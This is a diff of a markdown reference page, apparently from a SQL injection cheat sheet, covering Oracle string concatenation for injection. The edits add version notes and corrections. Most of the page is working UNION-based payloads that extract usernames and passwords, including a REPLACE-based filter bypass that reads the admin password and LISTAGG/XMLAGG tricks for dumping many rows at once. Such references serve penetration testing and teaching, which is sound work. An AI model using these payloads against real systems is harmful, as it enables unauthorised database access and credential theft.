@@ -4,7 +4,7 @@ description: Techniques for concatenating strings in Oracle SQL injection
 category: Injection Techniques
 order: 9
 tags: ["concatenation", "string manipulation", "injection"]
-lastUpdated: 2025-03-15
+lastUpdated: 2026-10-08
 ---
 
 String concatenation plays a crucial role in crafting complex SQL injection payloads in Oracle databases. Understanding the various concatenation methods can help bypass filters and construct dynamic queries.
@@ -13,12 +13,14 @@ String concatenation plays a crucial role in crafting complex SQL injection payl
 
 Oracle provides multiple ways to concatenate strings:
 
-| Method               | Description                         | Example                                                          | Result             |
-| -------------------- | ----------------------------------- | ---------------------------------------------------------------- | ------------------ |
-| Double pipe `\|\|`   | Standard SQL concatenation operator | `'ABC' \|\| 'DEF'`                                               | `ABCDEF`           |
-| `CONCAT()` function  | Two-argument concatenation function | `CONCAT('ABC', 'DEF')`                                           | `ABCDEF`           |
-| `LISTAGG()` function | Aggregate with separator (11g R2+)  | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)`                  | `A,B,C`            |
-| `XMLCONCAT()`        | XML-based concatenation             | `XMLCONCAT(XMLELEMENT(E, 'A'), XMLELEMENT(E, 'B')).GETCLOBVAL()` | Complex XML result |
+| Method               | Description                                               | Example                                                          | Result   |
+| -------------------- | --------------------------------------------------------- | ---------------------------------------------------------------- | -------- |
+| Double pipe `\|\|`   | Standard SQL concatenation operator                       | `'ABC' \|\| 'DEF'`                                               | `ABCDEF` |
+| `CONCAT()` function  | Two arguments before 23ai, any number from 23ai           | `CONCAT('ABC', 'DEF')`                                           | `ABCDEF` |
+| `LISTAGG()` function | Aggregates rows with a separator (11g R2+)                | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)`                  | `A,B,C`  |
+| `XMLAGG()` function  | Aggregates rows through XML (works before 11g R2 as well) | `XMLCAST(XMLAGG(XMLELEMENT(E, col \|\| ',')) AS VARCHAR2(4000))` | `A,B,C,` |
+
+Unlike most databases, Oracle treats `NULL` as an empty string in concatenation: `'a' || NULL || 'b'` is `ab`, not `NULL`.
 
 ## Using Double Pipe Operator
 
@@ -29,7 +31,7 @@ The double pipe (`||`) is the most common concatenation method in Oracle:
 SELECT 'Hello' || ' ' || 'World' FROM dual
 
 -- Concatenating with columns
-SELECT first_name || ' ' || last_name AS full_name FROM employees
+SELECT username || ' <' || email || '>' AS contact FROM users
 
 -- Concatenating with functions
 SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
@@ -38,6 +40,8 @@ SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
 ## SQL Injection Examples
 
 ### Basic Concatenation Injection
+
+In a string context, concatenation keeps the quotes balanced, so no comment is needed. The injected value replaces the original string, which is useful when the value is stored or displayed (for example in an `INSERT` or `UPDATE`):
 
 ```sql
 -- Breaking out of quoted string
@@ -51,6 +55,8 @@ SELECT 'User: ' || SYS_CONTEXT('USERENV', 'SESSION_USER') FROM dual
 ```
 
 ### UNION Attack with Concatenation
+
+The UNION examples on this page assume a two-column string query such as `SELECT username, email FROM users WHERE username = '<input>'`. Concatenation puts several values into one column:
 
 ```sql
 -- UNION with concatenated columns
@@ -70,51 +76,58 @@ The CONCAT function can be useful when the `||` operator is filtered:
 -- Basic CONCAT usage
 ' UNION SELECT CONCAT('User: ', username), NULL FROM users--
 
--- Nested CONCAT
-' UNION SELECT CONCAT(CONCAT('ID:', user_id), CONCAT(':', password)), NULL FROM users--
+-- Nested CONCAT (needed before 23ai, where CONCAT takes only two arguments)
+' UNION SELECT CONCAT(CONCAT('ID:', id), CONCAT(':', password)), NULL FROM users--
+
+-- 23ai and later only: any number of arguments (ORA-00909 on 21c and earlier)
+' UNION SELECT CONCAT('ID:', id, ':', password), NULL FROM users--
 ```
 
 ### Using XMLAGG for Row Concatenation
 
-XMLAGG is powerful for concatenating values across multiple rows:
+XMLAGG concatenates values across multiple rows, also on versions without LISTAGG:
 
 ```sql
--- Concatenate all usernames into one row
-' UNION SELECT XMLAGG(XMLELEMENT(E, username || ',')).EXTRACT('//text()').GETCLOBVAL(), NULL FROM users--
+-- Concatenate all usernames into one row (11g+)
+' UNION SELECT XMLCAST(XMLAGG(XMLELEMENT(E, username || ',')) AS VARCHAR2(4000)), NULL FROM users--
 
--- With ordering
-' UNION SELECT XMLAGG(XMLELEMENT(E, username || ',') ORDER BY username).EXTRACT('//text()').GETCLOBVAL(), NULL FROM users--
+-- With ordering, older versions (EXTRACT is deprecated but still available)
+' UNION SELECT RTRIM(XMLAGG(XMLELEMENT(E, username || ',') ORDER BY username).EXTRACT('//text()').GETSTRINGVAL(), ','), NULL FROM users--
 ```
 
-### Using LISTAGG for Row Concatenation (11g+)
+`GETCLOBVAL()` returns a CLOB, which fails in a UNION with a `VARCHAR2` column (`ORA-01790`); use `GETSTRINGVAL()` or `XMLCAST(... AS VARCHAR2(4000))`. `EXTRACT('//text()')` leaves XML entities such as `&amp;` in the output; `XMLCAST` does not.
+
+### Using LISTAGG for Row Concatenation (11g R2+)
 
 ```sql
 -- Basic LISTAGG
 ' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users--
 
 -- LISTAGG with conditions
-' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) || ' (Total: ' || COUNT(*) || ')', NULL FROM users WHERE username LIKE 'A%'--
+' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) || ' (Total: ' || COUNT(*) || ')', NULL FROM users WHERE username LIKE 'a%'--
 ```
 
 ## Bypassing Filters
 
 ### Bypassing Concatenation Filters
 
-When `||` or CONCAT is filtered:
+When `||` is filtered, use `CONCAT`. When both are filtered, `REPLACE` can insert one string into another:
 
 ```sql
--- Using CHR() with concatenation
-' UNION SELECT CHR(65)||CHR(66)||CHR(67), NULL FROM dual--  -- 'ABC'
+-- CONCAT instead of ||
+' UNION SELECT CONCAT(CHR(65), CHR(66)), NULL FROM dual--  -- 'AB'
 
--- Using REPLACE as concatenation
-' UNION SELECT REPLACE('XYZ', 'X', 'A')||REPLACE('XYZ', 'X', 'B'), NULL FROM dual--
+-- REPLACE as concatenation: 'admin:' followed by the password
+' UNION SELECT REPLACE('admin:~', '~', (SELECT password FROM users WHERE username='admin')), NULL FROM dual--
 ```
 
 ### Using TO_CHAR for Concatenation
 
+`||` converts numbers and dates implicitly; `TO_CHAR` controls the format:
+
 ```sql
 -- Converting non-string data for concatenation
-' UNION SELECT 'ID:' || TO_CHAR(employee_id), NULL FROM employees--
+' UNION SELECT 'ID:' || TO_CHAR(id), NULL FROM employees--
 
 -- Date formatting with concatenation
 ' UNION SELECT 'Date: ' || TO_CHAR(SYSDATE, 'YYYY-MM-DD HH24:MI:SS'), NULL FROM dual--
@@ -142,16 +155,20 @@ When `||` or CONCAT is filtered:
 
 ## Working with NULLs
 
+Concatenating a `NULL` does not empty the result, but `NVL` makes missing values visible:
+
 ```sql
--- Handling NULLs in concatenation
 ' UNION SELECT NVL(username, 'Anonymous') || ':' || NVL(email, 'No Email'), NULL FROM users--
 ```
 
 ## Performance Considerations
 
-For large-scale data extraction:
+LISTAGG fails with `ORA-01489: result of string concatenation is too long` when the result exceeds the `VARCHAR2` limit (4000 bytes by default), so wrapping it in `SUBSTR` does not help. From 12c R2, `ON OVERFLOW TRUNCATE` cuts the list instead:
 
 ```sql
--- Limiting concatenated output size
-' UNION SELECT SUBSTR(LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), 1, 1000), NULL FROM users--
+-- Truncate long lists instead of failing (12c R2+)
+' UNION SELECT LISTAGG(username, ',' ON OVERFLOW TRUNCATE) WITHIN GROUP (ORDER BY username), NULL FROM users--
+
+-- Older versions: page through the rows instead
+' UNION SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username), NULL FROM users WHERE id BETWEEN 1 AND 100--
 ```
